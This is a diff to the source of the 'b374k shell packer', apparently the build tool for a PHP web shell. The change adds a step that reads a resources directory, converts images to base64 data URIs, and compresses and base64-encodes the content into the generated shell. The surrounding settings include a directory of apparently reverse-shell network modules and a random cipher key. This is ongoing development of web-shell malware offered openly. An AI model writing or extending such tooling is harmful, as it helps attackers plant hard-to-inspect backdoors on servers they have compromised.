@@ -11,20 +11,38 @@
 
 */
 $GLOBALS['packer']['title'] = "b374k shell packer";
-$GLOBALS['packer']['version'] = "0.4.4";
+$GLOBALS['packer']['version'] = "0.4.5";
 $GLOBALS['packer']['base_dir'] = "./base/";
 $GLOBALS['packer']['module_dir'] = "./module/";
 $GLOBALS['packer']['theme_dir'] = "./theme/";
 $GLOBALS['packer']['module'] = packer_get_module();
 $GLOBALS['packer']['theme'] = packer_get_theme();
 $GLOBALS['packer']['network_rs_dir'] = "./network/rs/";
+$GLOBALS['packer']['resources_dir'] = "./resources/";
 $GLOBALS['cipher_key'] = generateRandomString(32);
 
 require $GLOBALS['packer']['base_dir'].'jsPacker.php';
 
 /* PHP FILES START */
 $base_code = "";
-$base_code .= packer_read_file($GLOBALS['packer']['base_dir']."resources.php");
+
+$resources_data = packer_read_file($GLOBALS['packer']['base_dir']."resources.php");
+$res_files = scandir($GLOBALS['packer']['resources_dir']);
+$resources_content = "";
+foreach($res_files as $res) {
+    if(!in_array($res, array(".",".."))) {
+        $res_data = packer_read_file($GLOBALS['packer']['resources_dir'] . $res);
+        $info = pathinfo($res);
+        $ext = $info['extension'];
+        if($ext == 'png' || $ext == 'jpg' || $ext == 'jpeg') {
+            $res_data = "data:image/".$ext.";base64," . base64_encode($res_data);
+        }
+        $resources_content .= "\$GLOBALS['resources']['" . basename($res, '.'.$ext) . "'] = '" . base64_encode(gzdeflate($res_data, 9)) . "';\n";
+    }
+}
+$resources_data = str_replace("//<__RES__>", $resources_content, $resources_data);
+$base_code .= $resources_data;
+
 $module_code = packer_read_file($GLOBALS['packer']['base_dir']."base.php");
 /* PHP FILES END */
 
